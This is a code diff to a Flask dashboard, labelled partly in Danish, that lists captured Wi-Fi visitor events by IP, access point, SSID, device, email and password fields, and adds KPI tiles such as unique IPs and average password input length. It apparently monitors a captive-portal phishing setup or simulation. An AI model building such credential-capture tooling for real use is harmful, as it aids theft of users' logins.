@@ -83,8 +83,9 @@ def _sanitize_event(event: dict[str, Any]) -> dict[str, Any]:
         "event": event.get("event"),
         "timestamp_utc": ts.get("utc"),
         "ip": network.get("ip"),
-        "ap": network.get("ap"),
+        "ap": network.get("ap") or None,
         "ssid": network.get("ssid"),
+        "session_id": session.get("id") or event.get("session_id"),
         "session_duration_sec": session.get("duration_sec") or event.get("session_duration_sec") or 0,
         "device_type": device.get("type"),
         "os": device.get("os"),
@@ -130,7 +131,7 @@ def create_dashboard_blueprint(
             "log_file": log_file,
             "count": len(events),
             "events": [_sanitize_event(e) for e in events]
-        })
+})
 
     # dashboard page
     @bp.get("/dashboard")
@@ -248,6 +249,37 @@ th, td {
     70%  { box-shadow: 0 0 0 10px rgba(239,68,68,0); }
     100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); }
 }
+
+.kpis {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    margin: 14px 0 18px 0;
+}
+
+.kpi {
+    border: 1px solid #e5e7eb;
+    border-radius: 10px;
+    padding: 12px;
+    background: #fff;
+}
+
+.kpi-value {
+    font-size: 18px;
+    font-weight: 600;
+    color: #111827;
+}
+
+.kpi-label {
+    font-size: 11px;
+    color: #6b7280;
+    margin-top: 4px;
+}
+
+.new-row {
+    background: #f0f9ff;
+    transition: background 2s ease;
+}
 </style>
 </head>
 
@@ -273,11 +305,37 @@ th, td {
     </div>
 </div>
 
+<div class="kpis">
+    <div class="kpi">
+        <div class="kpi-value" id="kpi-events">0</div>
+        <div class="kpi-label">Events (5 min)</div>
+    </div>
+
+    <div class="kpi">
+        <div class="kpi-value" id="kpi-ips">0</div>
+        <div class="kpi-label">Unikke IP’er</div>
+    </div>
+
+    <div class="kpi">
+        <div class="kpi-value" id="kpi-sessions">0</div>
+        <div class="kpi-label">Sessions</div>
+    </div>
+
+    <div class="kpi">
+        <div class="kpi-value" id="kpi-pw">0</div>
+        <div class="kpi-label">Avg input length</div>
+    </div>
+
+    <div class="kpi">
+        <div class="kpi-value" id="kpi-rate">0</div>
+        <div class="kpi-label">Events/min</div>
+    </div>
+</div>
+
 <table>
 <thead>
 <tr>
-<th>Tid</th><th>IP</th><th>SSID</th><th>Device</th><th>OS</th><th>Browser</th><th>Email</th><th>Pw</th>
-</tr>
+<th>#</th><th>Tid</th><th>IP</th><th>AP</th><th>SSID</th><th>Device</th><th>OS</th><th>Browser</th><th>Email</th><th>Pw</th></tr>
 </thead>
 <tbody id="rows"></tbody>
 </table>
@@ -298,6 +356,35 @@ function setLive(v){
     statusEl.textContent = v ? "live" : "offline";
 }
 
+function computeKpis(events){
+    const now = Date.now();
+    const fiveMin = 5 * 60 * 1000;
+
+    const recent = events.filter(e => {
+        const t = new Date(e.timestamp_utc || 0).getTime();
+        return now - t < fiveMin;
+    });
+
+    const ips = new Set(events.map(e => e.ip).filter(Boolean));
+
+    const sessions = new Set(events.map(e => e.session_id).filter(Boolean));
+
+
+    const avgInput = events.length
+        ? (events.reduce((a, e) => a + (e.password_len || 0), 0) / events.length)
+        : 0;
+
+    const rate = recent.length / 5;
+
+    return {
+        events5m: recent.length,
+        ips: ips.size,
+        sessions: sessions.size,
+        avgInput: avgInput.toFixed(1),
+        rate: rate.toFixed(1)
+    };
+}
+
 async function load(){
     const qs = new URLSearchParams(location.search);
     const token = qs.get("token") || "";
@@ -306,13 +393,15 @@ async function load(){
         const res = await fetch("/api/events?limit=200" + (token ? `&token=${token}` : ""));
         const data = await res.json();
 
-        const ev = (data.events || []).slice(-200);
+        const ev = (data.events || []).slice().reverse().slice(0, 200);
 
-        rows.innerHTML = ev.map(e => `
+        rows.innerHTML = ev.map((e, i) => `
             <tr>
+                <td>${i + 1}</td>
                 <td>${new Date(e.timestamp_utc || "").toLocaleTimeString("da-DK")}</td>
                 <td>${e.ip || ""}</td>
-                <td>${e.ssid || ""}</td>
+                <td>${e.ap || "unknown"}</td>
+                <td>${e.ssid || "unknown"}</td>
                 <td><span class="badge">${e.device_type || ""}</span></td>
                 <td>${e.os || ""}</td>
                 <td>${e.browser || ""}</td>
@@ -321,9 +410,30 @@ async function load(){
             </tr>
         `).join("");
 
-        setLive(true);   // only success = green
+setTimeout(() => {
+    const rows = document.querySelectorAll("tbody tr");
+    if (rows.length) {
+        const last = rows[0];
+        last.classList.add("new-row");
+
+        setTimeout(() => {
+            last.classList.remove("new-row");
+        }, 2000);
+    }
+}, 50);
+
+        const k = computeKpis(ev);
+
+        document.getElementById("kpi-events").textContent = k.events5m;
+        document.getElementById("kpi-ips").textContent = k.ips;
+        document.getElementById("kpi-sessions").textContent = k.sessions;
+        document.getElementById("kpi-pw").textContent = k.avgInput;
+        document.getElementById("kpi-rate").textContent = k.rate;
+
+        setLive(true);
+
     } catch (err) {
-        setLive(false);  // only real failure = red
+        setLive(false);
     }
 }
 
